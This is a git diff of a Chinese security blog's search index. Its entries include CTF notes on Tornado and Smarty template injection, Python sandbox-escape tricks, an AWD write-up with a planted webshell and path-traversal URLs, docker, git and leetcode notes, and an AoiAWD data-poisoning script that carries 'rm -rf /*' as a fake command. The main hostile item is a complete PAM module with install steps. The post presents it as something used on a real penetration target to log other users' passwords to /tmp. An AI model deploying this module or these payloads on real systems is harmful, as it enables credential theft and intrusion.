+ssti 注入点在 msg
+注入49出现 orz 应该是有过滤
+1正常
+hint 里缺 cookie_secret
+该项在 handler.settings
+
+Handler 这个对象，Handler 指向的处理当前这个页面的 RequestHandler 对象
+RequestHandler 中并没有 settings 这个属性，与 RequestHandler 关联的 Application 对象（Requestion.application）才有 setting 这个属性
+handler 指向 RequestHandler
+而 RequestHandler.settings 又指向 self.application.settings
+所有 handler.settings 就指向 RequestHandler.application.settings 了！
+
+然后按 hint 里的 MD5 加密过后传参
+
+1?filename=/fllllllllllllag&amp;filehash=ff92d5623223cadc00efabfc7676f9fe
+filehash 不同 请自行加密
+
+ [BJDCTF2020]The mystery of ip
+
+1234567891011121314151617181920212223242526272829303132333435&lt;?php
+	require_once(&#39;header.php&#39;);
+	require_once(&#39;./libs/Smarty.class.php&#39;);
+	$smarty = new Smarty();
+	if (!empty($_SERVER[&#39;HTTP_CLIENT_IP&#39;]))
+	{
+		   $ip=$_SERVER[&#39;HTTP_CLIENT_IP&#39;];
+	}
+	elseif (!empty($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]))
+	{
+	    $ip=$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];
+	}
+	else
+	{
+	    $ip=$_SERVER[&#39;REMOTE_ADDR&#39;];
+	}
+	//$your_ip = $smarty-&gt;display(&quot;string:&quot;.$ip);
+	echo &quot;&lt;div class=\&quot;container panel1\&quot;&gt;
+				&lt;div class=\&quot;row\&quot;&gt;
+				&lt;div class=\&quot;col-md-4\&quot;&gt;
+				&lt;/div&gt;
+				&lt;div class=\&quot;col-md-4\&quot;&gt;
+				&lt;div class=\&quot;jumbotron pan\&quot;&gt;
+					&lt;div class=\&quot;form-group log\&quot;&gt;
+						&lt;label&gt;&lt;h2&gt;Your IP is : &quot;;
+	$smarty-&gt;display(&quot;string:&quot;.$ip);
+	echo &quot;				&lt;/h2&gt;&lt;/label&gt;
+					&lt;/div&gt;
+				&lt;/div&gt;
+				&lt;/div&gt;
+				&lt;div class=\&quot;col-md-4\&quot;&gt;
+				&lt;/div&gt;
+				&lt;/div&gt;
+			&lt;/div&gt;&quot;;
+	?&gt;
+
+ [BJDCTF2020]Cookie is so stable
+
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>SSTI</tag>
+        <tag>模板注入</tag>
       </tags>
   </entry>
   <entry>
@@ -1419,90 +1503,6 @@ print(res.text)
       </tags>
   </entry>
   <entry>
-    <title>PyJail python沙箱逃逸探究</title>
-    <url>/2023/02/PyJail%20python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%8E%A2%E7%A9%B6/</url>
-    <content><![CDATA[ python 特性
-在 python 中，类均继承自object基类；
- python 魔术方法
-
-__init__：构造函数。这个在实例化类的时候就会用到，一般是接受类初始化的参数，并且进行一系列初始化操作。
-__len__：返回对象的长度。
-__str__：返回对象的字符串表示。对一个对象a使用str(a)时，会尝试调用a.__str__()。相似地，还有__int__魔术方法也用于类型转换，不过较少使用。
-__getitem__：根据索引返回对象的某个元素。对一个对象a使用a[1]时，会尝试调用a.__getitem__(1)。
-__add__、__sub__、__mul__、__div__、__mod__：算术运算，加减乘除模。如对一个对象a使用a+b时，会尝试调用a.__add__(b)。相应地，对于有些运算，对象需放在后面（第二个操作数）的，则需实现__radd__、__rsub__、__rmul__、__rdiv__、__rmod__，如椭圆曲线上的点的倍点运算G -&gt; d * G，就可以通过实现__rmul__来实现。
-__and__，__or__、__xor__：逻辑运算，和算术运算类似；
-__eq__，__ne__、__lt__、__gt__、__le__、__ge__：比较运算，和算术运算类似；例如'贵州' &gt; '广西'，就会转而调用'贵州'.__gt__('广西')；
-__getattr__：对象是否含有某属性。如果我们对对象a所对应的类实现了该方法，那么在调用未实现的a.b时，就会转而调用a.__getattr__(b)。这也等价于用函数的方法调用：getattr(a, 'b')。有__getattr__，自然也有对应的__setattr__；
-__subclasses__：返回当前类的所有子类。一般是用在object类中，在object.__subclasses__()中，我们可以找到os模块中的类，然后再找到os，并且执行os.system，实现 RCE。
-
- python 魔术属性
-
-
-__dict__：可以查看内部所有属性名和属性值组成的字典。
-
-
-__doc__：类的帮助文档。默认类均有帮助文档。对于自定义的类，需要我们自己实现。
-
-
-__class__：返回当前对象所属的类。如''.__class__会返回&lt;class 'str'&gt;。拿到类之后，就可以通过构造函数生成新的对象，如''.__class__(4396)，就等价于str(4396)，即'4396'；
-
-
-__base__：返回当前类的基类。如str.__base__会返回&lt;class 'object'&gt;；
-
-
- 其他内置函数和变量
-
-dir：查看对象的所有属性和方法。在我们没有思路的时候，可以通过该函数查看所有可以利用的方法；此外，在题目禁用引号以及小数点时，也可以先用拿到类所有可用方法，再索引到方法名，并且通过getattr来拿到目标方法。
-chr、ord：字符与 ASCII 码转换函数，能帮我们绕过一些 WAF
-globals：返回所有全局变量的函数；
-locals：返回所有局部变量的函数；
-__import__：载入模块的函数。例如import os等价于os = __import__('os')；
-__name__：该变量指示当前运行环境位于哪个模块中。如我们 python 一般写的if __name__ == '__main__':，就是来判断是否是直接运行该脚本。如果是从另外的地方 import 的该脚本的话，那__name__就不为__main__，就不会执行之后的代码。更多参考这里；
-__builtins__：包含当前运行环境中默认的所有函数与类。如上面所介绍的所有默认函数，如str、chr、ord、dict、dir等。在 pyjail 的沙箱中，往往__builtins__被置为None，因此我们不能利用上述的函数。所以一种思路就是我们可以先通过类的基类和子类拿到__builtins__，再__import__('os').system('sh')进行 RCE；
-__file__：该变量指示当前运行代码所在路径。如open(__file__).read()就是读取当前运行的 python 文件代码。需要注意的是，该变量仅在运行代码文件时会产生，在运行交互式终端时不会有此变量；
-_：该变量返回上一次运行的 python 语句结果。需要注意的是，该变量仅在运行交互式终端时会产生，在运行代码文件时不会有此变量。
-
- WAF
- 过滤[]
-使用pop、__getitem__ 代替
-例如：a.__getitem__(0)、{&quot;a&quot;: 1}.pop(&quot;a&quot;)
-或使用 next 等指针指向(类似无参 RCE 特殊函数遍历)
-需要去别的是 python 需要使用迭代器iter(object[, sentinel])作为传入函数
- 过滤字符
- chr() 函数构造字符
- 利用输出
-1str(().__class__.__new__)[i]+……
-12&gt;&gt;&gt;print(str(().__class__.__new__))
-&lt;built-in method __new__ of type object at 0x00007FFF01FE8AB0&gt;
- 过滤数字
-
-0：int(bool([]))、Flase、len([])、any(())
-1：int(bool([&quot;&quot;]))、True、all(())、int(list(list(dict(a၁=())).pop()).pop())
-len：len(str({}.keys))
-1.0：float(True)
--1：~0
-
- 过滤特殊字符
-str 被过滤type('')()、format() 即可。同理，int、list 都可以用 type 构造出来。
- Non-ASCII Identifiers
-在 python3 中支持 Non-ASCII Identifies 并且所有都会被转换成 unicode 的 NFKC（也就是标准模式）。我们可以用斜体或者花体各种各样的与标准字母相像的来进行导包操作。
-
- 参考链接
-PyJail python 沙箱逃逸探究·总览
-pyjail-学习总结【CV】 | TWe1v3
-
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>python</tag>
-        <tag>沙箱逃逸</tag>
-        <tag>PyJail</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Visual Studio 2022界面美化教程</title>
     <url>/2021/12/Visual%20Studio%202022%E7%95%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/</url>
     <content><![CDATA[
@@ -1625,52 +1625,6 @@ proc/net/arp
       </tags>
   </entry>
   <entry>
-    <title>2024 长城杯铁人三项半决赛第二赛区 wp</title>
-    <url>/2024/05/awdwp/</url>
-    <content><![CDATA[(未整理完)
- CFS
- misc1
-备份文件泄露
-下载后是流量包
-流量包存在明文 flag
-（这里可能是非预期，预期是 aes 破解到 test 密码后，有个页面有个 flag）
-
- misc2
-流量里还有一个 flag.zip
-导出后
-爆破得密码为 123456
- web
-存在 rce 查看解析目录后 echo 一句话木马进去
-连接后 cat /flag 啥啥啥.txt
-flag get
-
- AWD
-题目附件备份：
-php
-java1
-java2
- php
-hook 流量发现一个 php 路径穿越
-/frontend/ajax/getfile?file=../../../../../../flag.txt
-修复：
-将/和.等用于路径穿越的字符过滤置空
-
- java1
-一个 java
-/forget.jsp?cmd1=cat+/flag.txt
-修复 把 cmd1 字段改成复杂密码 使攻击者无法连接
-
-]]></content>
-      <categories>
-        <category>awd</category>
-      </categories>
-      <tags>
-        <tag>awd</tag>
-        <tag>长城杯</tag>
-        <tag>铁人三项</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>arch + niri + noctalia-shell安装记录</title>
     <url>/2026/01/arch/</url>
     <content><![CDATA[
@@ -1733,6 +1687,52 @@ Noctalia-shell ↩︎
         <tag>niri</tag>
         <tag>noctalia</tag>
         <tag>shell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2024 长城杯铁人三项半决赛第二赛区 wp</title>
+    <url>/2024/05/awdwp/</url>
+    <content><![CDATA[(未整理完)
+ CFS
+ misc1
+备份文件泄露
+下载后是流量包
+流量包存在明文 flag
+（这里可能是非预期，预期是 aes 破解到 test 密码后，有个页面有个 flag）
+
+ misc2
+流量里还有一个 flag.zip
+导出后
+爆破得密码为 123456
+ web
+存在 rce 查看解析目录后 echo 一句话木马进去
+连接后 cat /flag 啥啥啥.txt
+flag get
+
+ AWD
+题目附件备份：
+php
+java1
+java2
+ php
+hook 流量发现一个 php 路径穿越
+/frontend/ajax/getfile?file=../../../../../../flag.txt
+修复：
+将/和.等用于路径穿越的字符过滤置空
+
+ java1
+一个 java
+/forget.jsp?cmd1=cat+/flag.txt
+修复 把 cmd1 字段改成复杂密码 使攻击者无法连接
+
+]]></content>
+      <categories>
+        <category>awd</category>
+      </categories>
+      <tags>
+        <tag>awd</tag>
+        <tag>长城杯</tag>
+        <tag>铁人三项</tag>
       </tags>
   </entry>
   <entry>
@@ -2105,94 +2105,6 @@ if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) {
       </tags>
   </entry>
   <entry>
-    <title>kali安装docker</title>
-    <url>/2022/03/docker/</url>
-    <content><![CDATA[ kali 安装 docker
-12345678apt-get update
-apt-get install docker-engine
-## 安装结束，打开docker服务
-service docker start
-## 验证安装，运行测试样例
-docker --version
-docker run hello-world
-#测试
- docker 常用命令
-12345docker --version
-docker images
-docker ps -a
-docker run -d --name 123 -p 127.0.0.1:80:80 镜像名
-docker stop 123
-其他常用命令见菜鸟教程
- dockers 底层原理
- Namespaces
-
-命名空间是 Linux 为我们提供的用于分离进程树、网络接口、挂载点以及进程间通信等资源的方法。在日常使用 Linux 时，我们并没有运行多个完全分离的服务器的需要，但是如果我们在服务器上启动了多个服务，这些服务其实会相互影响的，每一个服务都能看到其他服务的进程，也可以访问宿主机器上的任意文件，这是很多时候我们都不愿意看到的，我们更希望运行在同一台机器上的不同服务能做到完全隔离，就像运行在多台不同的机器上一样。
-
- CGroups
-
-我们通过 Linux 的命名空间为新创建的进程隔离了文件系统、网络并与宿主机器之间的进程相互隔离，但是命名空间并不能够为我们提供物理资源上的隔离，比如 CPU 或者内存，如果在同一台机器上运行了多个对彼此以及宿主机器一无所知的『容器』，这些容器却共同占用了宿主机器的物理资源。
-如果其中的某一个容器正在执行 CPU 密集型的任务，那么就会影响其他容器中任务的性能与执行效率，导致多个容器相互影响并且抢占资源。如何对多个容器的资源使用进行限制就成了解决进程虚拟资源隔离之后的主要问题，而 Control Groups（简称 CGroups）就是能够隔离宿主机器上的物理资源，例如 CPU、内存、磁盘 I/O 和网络带宽。
-在 CGroup 中，所有的任务就是一个系统的一个进程，而 CGroup 就是一组按照某种标准划分的进程，在 CGroup 这种机制中，所有的资源控制都是以 CGroup 作为单位实现的，每一个进程都可以随时加入一个 CGroup 也可以随时退出一个 CGroup。
-
-]]></content>
-      <categories>
-        <category>教程</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>kali</tag>
-        <tag>docker</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>git命令</title>
-    <url>/2022/02/git/</url>
-    <content><![CDATA[ 创建仓库命令
- init
-git init 命令用于在目录中创建新的 Git 仓库。
-在文件夹中，会被创建出一个.git 的一个隐藏文件，这时，本地库已经初始化完成.
- clone
-git clone 拷贝一个 Git 仓库到本地，让自己能够查看该项目，或者进行修改。
-拷贝项目命令格式如下：
-1git clone [url]
- 提交与修改
- add
-git add 命令可将该文件添加到暂存区。
-添加一个或多个文件到暂存区
- commit
-git commit 命令将暂存区内容添加到本地仓库中。
-提交暂存区到本地仓库中:
-1git commit -m [message]
-[message] 可以是一些备注信息。
- status
-git status 命令用于查看在你上次提交之后是否有对文件进行再次修改。
- rm
-git rm 命令用于删除文件。
-如果只是简单地从工作目录中手工删除文件，运行 git status 时就会在 Changes not staged for commit 的提示。
- mv
-git mv 命令用于移动或重命名一个文件、目录或软连接。
-1git mv [file] [newfile]
-如果新文件名已经存在，但还是要重命名它，可以使用 -f 参数：
-1git mv -f [file] [newfile]
- 远程操作
- remote
-显示所有远程仓库：
-1git remote -v
- pull
-git pull 命令用于从远程获取代码并合并本地的版本。
-1git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;
- push
-git push 命用于从将本地的分支版本上传到远程并合并。
-1git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>git</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ctfshow黑盒测试</title>
     <url>/2023/01/ctfshow%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/</url>
     <content><![CDATA[ web380
@@ -2290,6 +2202,94 @@ clear.php?file=./install/lock.dat
       <tags>
         <tag>web</tag>
         <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>kali安装docker</title>
+    <url>/2022/03/docker/</url>
+    <content><![CDATA[ kali 安装 docker
+12345678apt-get update
+apt-get install docker-engine
+## 安装结束，打开docker服务
+service docker start
+## 验证安装，运行测试样例
+docker --version
+docker run hello-world
+#测试
+ docker 常用命令
+12345docker --version
+docker images
+docker ps -a
+docker run -d --name 123 -p 127.0.0.1:80:80 镜像名
+docker stop 123
+其他常用命令见菜鸟教程
+ dockers 底层原理
+ Namespaces
+
+命名空间是 Linux 为我们提供的用于分离进程树、网络接口、挂载点以及进程间通信等资源的方法。在日常使用 Linux 时，我们并没有运行多个完全分离的服务器的需要，但是如果我们在服务器上启动了多个服务，这些服务其实会相互影响的，每一个服务都能看到其他服务的进程，也可以访问宿主机器上的任意文件，这是很多时候我们都不愿意看到的，我们更希望运行在同一台机器上的不同服务能做到完全隔离，就像运行在多台不同的机器上一样。
+
+ CGroups
+
+我们通过 Linux 的命名空间为新创建的进程隔离了文件系统、网络并与宿主机器之间的进程相互隔离，但是命名空间并不能够为我们提供物理资源上的隔离，比如 CPU 或者内存，如果在同一台机器上运行了多个对彼此以及宿主机器一无所知的『容器』，这些容器却共同占用了宿主机器的物理资源。
+如果其中的某一个容器正在执行 CPU 密集型的任务，那么就会影响其他容器中任务的性能与执行效率，导致多个容器相互影响并且抢占资源。如何对多个容器的资源使用进行限制就成了解决进程虚拟资源隔离之后的主要问题，而 Control Groups（简称 CGroups）就是能够隔离宿主机器上的物理资源，例如 CPU、内存、磁盘 I/O 和网络带宽。
+在 CGroup 中，所有的任务就是一个系统的一个进程，而 CGroup 就是一组按照某种标准划分的进程，在 CGroup 这种机制中，所有的资源控制都是以 CGroup 作为单位实现的，每一个进程都可以随时加入一个 CGroup 也可以随时退出一个 CGroup。
+
+]]></content>
+      <categories>
+        <category>教程</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>kali</tag>
+        <tag>docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>git命令</title>
+    <url>/2022/02/git/</url>
+    <content><![CDATA[ 创建仓库命令
+ init
+git init 命令用于在目录中创建新的 Git 仓库。
+在文件夹中，会被创建出一个.git 的一个隐藏文件，这时，本地库已经初始化完成.
+ clone
+git clone 拷贝一个 Git 仓库到本地，让自己能够查看该项目，或者进行修改。
+拷贝项目命令格式如下：
+1git clone [url]
+ 提交与修改
+ add
+git add 命令可将该文件添加到暂存区。
+添加一个或多个文件到暂存区
+ commit
+git commit 命令将暂存区内容添加到本地仓库中。
+提交暂存区到本地仓库中:
+1git commit -m [message]
+[message] 可以是一些备注信息。
+ status
+git status 命令用于查看在你上次提交之后是否有对文件进行再次修改。
+ rm
+git rm 命令用于删除文件。
+如果只是简单地从工作目录中手工删除文件，运行 git status 时就会在 Changes not staged for commit 的提示。
+ mv
+git mv 命令用于移动或重命名一个文件、目录或软连接。
+1git mv [file] [newfile]
+如果新文件名已经存在，但还是要重命名它，可以使用 -f 参数：
+1git mv -f [file] [newfile]
+ 远程操作
+ remote
+显示所有远程仓库：
+1git remote -v
+ pull
+git pull 命令用于从远程获取代码并合并本地的版本。
+1git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;
+ push
+git push 命用于从将本地的分支版本上传到远程并合并。
+1git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>git</tag>
       </tags>
   </entry>
   <entry>
@@ -2554,59 +2554,6 @@ print(token + &quot;.&quot; + sig)
       </tags>
   </entry>
   <entry>
-    <title>力扣 394.字符串解码 特殊解</title>
-    <url>/2025/02/leetcode%20394/</url>
-    <content><![CDATA[394.字符串解码
-
-一种独创的 不用辅助栈的解(笑)
-
-
- 思路
-不用栈 遍历字符串转 python 表达式 eval 直出
- 解题过程
-对于 python，我们可用 eval 函数将一串字符串当作 python 语句直接执行
-那么对于四个例子我们可以转换成代码中注释部分的表达式
-1234eval(&#39;3*(&quot;a&quot;) + 2*(&quot;bc&quot;)&#39;)
-eval(&#39;3*(&quot;a&quot;+2*(&quot;c&quot;))&#39;)
-eval(&#39;2*(&quot;abc&quot;)+3*(&quot;cd&quot;)+&quot;ef&quot;&#39;)
-eval(&#39;&quot;abc&quot;+3*(&quot;cd&quot;)+&quot;xyz&quot;&#39;)
- 复杂度
-
-时间复杂度: O(n)
-空间复杂度: O(n)
-
- Code
-12345678910111213141516171819202122class Solution:
-    def decodeString(self, s: str) -&gt; str:
-        func = &#39;&#39; # 用于存表达式
-        for i in range(len(s)):
-            if s[i].isdigit():
-                if i &gt; 0 and not s[i - 1].isdigit():
-                    func += &quot;+&quot;
-                func += s[i]
-            elif s[i] == &quot;[&quot;:
-                func += &quot;*(&quot;
-            elif s[i] == &quot;]&quot;:
-                func += &quot;)&quot;
-                if i &lt; len(s) - 1 and s[i + 1] != &quot;]&quot; and not s[i + 1].isdigit():
-                    func += &quot;+&quot;
-            else:
-                if i == 0 or not s[i - 1].isalpha():
-                    func += &#39;&quot;&#39;
-                func += s[i]
-                if i == len(s) - 1 or not s[i + 1].isalpha():
-                    func += &#39;&quot;&#39;
-        print(func)
-        return eval(func)]]></content>
-      <categories>
-        <category>算法</category>
-      </categories>
-      <tags>
-        <tag>leetcode</tag>
-        <tag>算法</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>linux动态加载</title>
     <url>/2022/05/linux%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</url>
     <content><![CDATA[ linux 动态加载
@@ -2667,103 +2614,56 @@ get
       </tags>
   </entry>
   <entry>
-    <title>.so劫持PAM监听密码</title>
-    <url>/2025/03/pam%E5%8A%AB%E6%8C%81%E5%AF%86%E7%A0%81/</url>
-    <content><![CDATA[ .so 劫持 PAM 监听密码
+    <title>力扣 394.字符串解码 特殊解</title>
+    <url>/2025/02/leetcode%20394/</url>
+    <content><![CDATA[394.字符串解码
 
-最近渗透遇见个主机，想通过劫持 PAM 监听密码来获取密码
-
-
-本文章适用于 Ubuntu，其他系统的不同之处可参考下文中的介绍做相应处理
+一种独创的 不用辅助栈的解(笑)
 
 
-本文章仅介绍操作方法，原理可见下面这篇文章
-centos 可见：利用Linux-PAM记录密码
-该文章不适用于 Ubuntu 等系统，因此写下本文章
+ 思路
+不用栈 遍历字符串转 python 表达式 eval 直出
+ 解题过程
+对于 python，我们可用 eval 函数将一串字符串当作 python 语句直接执行
+那么对于四个例子我们可以转换成代码中注释部分的表达式
+1234eval(&#39;3*(&quot;a&quot;) + 2*(&quot;bc&quot;)&#39;)
+eval(&#39;3*(&quot;a&quot;+2*(&quot;c&quot;))&#39;)
+eval(&#39;2*(&quot;abc&quot;)+3*(&quot;cd&quot;)+&quot;ef&quot;&#39;)
+eval(&#39;&quot;abc&quot;+3*(&quot;cd&quot;)+&quot;xyz&quot;&#39;)
+ 复杂度
 
-任意目录新建 ssh.c：
-12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-#include &lt;security/pam_appl.h&gt;
-#include &lt;security/pam_modules.h&gt;
-#include &lt;security/pam_ext.h&gt;
-#include &lt;unistd.h&gt;
+时间复杂度: O(n)
+空间复杂度: O(n)
 
-#define STOREPATH &quot;/tmp/example.txt&quot;
-
-PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
-  return PAM_SUCCESS;
-}
-
-PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
-  return PAM_SUCCESS;
-}
-
-PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
-  int retval;
-  const char* username;
-  const char* password;
-  char hostname[128];
-
-  retval = pam_get_user(pamh, &amp;username, &quot;Username: &quot;);
-  if (retval != PAM_SUCCESS) {
-    return retval;
-  }
-
-  retval = pam_get_authtok(pamh,PAM_AUTHTOK,&amp;password,NULL);
-  if (retval != PAM_SUCCESS) {
-    return retval;
-  }
-
-  gethostname(hostname, sizeof hostname);
-
-  FILE *fp = NULL;
-  fp = fopen(STOREPATH, &quot;a+&quot;);
-  fprintf(fp, &quot;%s：%s：%s\n&quot;,hostname,username,password);
-  fclose(fp);
-
-  return PAM_SUCCESS;
-}
-同目录下新建 Makefile，写入：
-1234CFLAGS += -Werror -Wall
-
-ssh.so: ssh.c
-	gcc $(CFLAGS) -fPIC -shared -Xlinker -x -o $@ $&lt;
-运行如下代码
-123apt-get install libpam0g-dev # 其它系统见下面的介绍1
-make
-cp ssh.so /usr/lib/x86_64-linux-gnu/security/ # 其它系统见下面的介绍2
-
-1：其它系统可搜索PAM开发包或者 xxx 系统的libpam0g-dev pam-devel包
-
-
-2：其它系统可查询/etc/pam.d/是否存在，不存在可以 bing 下类似作用的文件夹
-然后查看common-auth common-account文件
-1find / -name xxx.so # xxx.so是上面两个文件中option部分的第三个参数
-一般命令结果第一个就是 security 的目录
-然后
-1cp ssh.so /path/to/security
-
-在/etc/pam.d/common-auth 中 option 部分中添加一行
-12auth optional ssh.so
-; 字符间间隔用tab键对齐 下面同理
-
-如果/etc/pam.d/common-account 不存在则将下面那行代码和上面那行代码放一块即可
-
-/etc/pam.d/common-account 同理
-1account optional ssh.so
-exit 退出再 ssh 登陆下或者其他需要密码的操作皆可
-然后查看/tmp/example.txt 中是否成功记录
-成功记录后等待其他用户登录该机器即可，隔几天登录查看下/tmp/example.txt
-]]></content>
+ Code
+12345678910111213141516171819202122class Solution:
+    def decodeString(self, s: str) -&gt; str:
+        func = &#39;&#39; # 用于存表达式
+        for i in range(len(s)):
+            if s[i].isdigit():
+                if i &gt; 0 and not s[i - 1].isdigit():
+                    func += &quot;+&quot;
+                func += s[i]
+            elif s[i] == &quot;[&quot;:
+                func += &quot;*(&quot;
+            elif s[i] == &quot;]&quot;:
+                func += &quot;)&quot;
+                if i &lt; len(s) - 1 and s[i + 1] != &quot;]&quot; and not s[i + 1].isdigit():
+                    func += &quot;+&quot;
+            else:
+                if i == 0 or not s[i - 1].isalpha():
+                    func += &#39;&quot;&#39;
+                func += s[i]
+                if i == len(s) - 1 or not s[i + 1].isalpha():
+                    func += &#39;&quot;&#39;
+        print(func)
+        return eval(func)]]></content>
       <categories>
-        <category>教程</category>
+        <category>算法</category>
       </categories>
       <tags>
-        <tag>渗透</tag>
-        <tag>权限维持</tag>
-        <tag>PAM</tag>
+        <tag>leetcode</tag>
+        <tag>算法</tag>
       </tags>
   </entry>
   <entry>
@@ -3368,6 +3268,187 @@ if(!isset($_POST[&#39;answer_key&#39;])){
       </tags>
   </entry>
   <entry>
+    <title>.so劫持PAM监听密码</title>
+    <url>/2025/03/pam%E5%8A%AB%E6%8C%81%E5%AF%86%E7%A0%81/</url>
+    <content><![CDATA[ .so 劫持 PAM 监听密码
+
+最近渗透遇见个主机，想通过劫持 PAM 监听密码来获取密码
+
+
+本文章适用于 Ubuntu，其他系统的不同之处可参考下文中的介绍做相应处理
+
+
+本文章仅介绍操作方法，原理可见下面这篇文章
+centos 可见：利用Linux-PAM记录密码
+该文章不适用于 Ubuntu 等系统，因此写下本文章
+
+任意目录新建 ssh.c：
+12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;security/pam_appl.h&gt;
+#include &lt;security/pam_modules.h&gt;
+#include &lt;security/pam_ext.h&gt;
+#include &lt;unistd.h&gt;
+
+#define STOREPATH &quot;/tmp/example.txt&quot;
+
+PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
+  return PAM_SUCCESS;
+}
+
+PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
+  return PAM_SUCCESS;
+}
+
+PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
+  int retval;
+  const char* username;
+  const char* password;
+  char hostname[128];
+
+  retval = pam_get_user(pamh, &amp;username, &quot;Username: &quot;);
+  if (retval != PAM_SUCCESS) {
+    return retval;
+  }
+
+  retval = pam_get_authtok(pamh,PAM_AUTHTOK,&amp;password,NULL);
+  if (retval != PAM_SUCCESS) {
+    return retval;
+  }
+
+  gethostname(hostname, sizeof hostname);
+
+  FILE *fp = NULL;
+  fp = fopen(STOREPATH, &quot;a+&quot;);
+  fprintf(fp, &quot;%s：%s：%s\n&quot;,hostname,username,password);
+  fclose(fp);
+
+  return PAM_SUCCESS;
+}
+同目录下新建 Makefile，写入：
+1234CFLAGS += -Werror -Wall
+
+ssh.so: ssh.c
+	gcc $(CFLAGS) -fPIC -shared -Xlinker -x -o $@ $&lt;
+运行如下代码
+123apt-get install libpam0g-dev # 其它系统见下面的介绍1
+make
+cp ssh.so /usr/lib/x86_64-linux-gnu/security/ # 其它系统见下面的介绍2
+
+1：其它系统可搜索PAM开发包或者 xxx 系统的libpam0g-dev pam-devel包
+
+
+2：其它系统可查询/etc/pam.d/是否存在，不存在可以 bing 下类似作用的文件夹
+然后查看common-auth common-account文件
+1find / -name xxx.so # xxx.so是上面两个文件中option部分的第三个参数
+一般命令结果第一个就是 security 的目录
+然后
+1cp ssh.so /path/to/security
+
+在/etc/pam.d/common-auth 中 option 部分中添加一行
+12auth optional ssh.so
+; 字符间间隔用tab键对齐 下面同理
+
+如果/etc/pam.d/common-account 不存在则将下面那行代码和上面那行代码放一块即可
+
+/etc/pam.d/common-account 同理
+1account optional ssh.so
+exit 退出再 ssh 登陆下或者其他需要密码的操作皆可
+然后查看/tmp/example.txt 中是否成功记录
+成功记录后等待其他用户登录该机器即可，隔几天登录查看下/tmp/example.txt
+]]></content>
+      <categories>
+        <category>教程</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>权限维持</tag>
+        <tag>PAM</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>AoiAWD反制脚本</title>
+    <url>/2024/05/untiAoi/</url>
+    <content><![CDATA[ AoiAWD 反制脚本
+ 起因
+在经历过 awd 比赛中 AoiAWD 多次崩溃后(长城杯 虽然最后还是进决赛摸鱼了)
+赛后研究了一下
+开发了这个反制脚本
+由于打点队友喜欢用 gogo
+所以这个脚本支持 gogo 扫描结果
+ 思路
+发现后端未验证来自靶机的数据
+因此存在脏数据污染
+针对此开发脚本
+可向 AoiAWD 的各个数据展示页面投放脏数据
+包括告警页面
+ 脚本
+再此公布本脚本，希望下次 awd 遇见的时候别打我，谢谢 QAQ
+12345678910111213141516171819202122232425262728293031323334353637383940414243import re
+import socket
+
+f = open(&quot;./ip.txt&quot;, &quot;r+&quot;)
+url_list = f.readlines()
+
+for i in url_list:
+    pattern = r&quot;tcp://(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+)&quot;
+    match = re.search(pattern, i, 0)
+    if match:
+        i = match.group(0).split(&quot;//&quot;)[1]
+        p = int(i.split(&quot;:&quot;)[1])
+        i = i.split(&quot;:&quot;)[0]
+        server_address = (i, p)  # 替换SERVER_IP和SERVER_PORT为实际值
+        data = &#39;{&quot;type&quot;:&quot;ping&quot;}\n&#39;
+        data2 = &#39;{&quot;type&quot;:&quot;new_process&quot;,&quot;data&quot;:{&quot;pid&quot;:&quot;114514&quot;,&quot;ppid&quot;:&quot;114514&quot;,&quot;uid&quot;:&quot;0&quot;,&quot;username&quot;:&quot;root&quot;,&quot;cmd&quot;:&quot;rm -rf /*&quot;,&quot;param&quot;:&quot;su root rm -rf /*&quot;}}\n&#39;
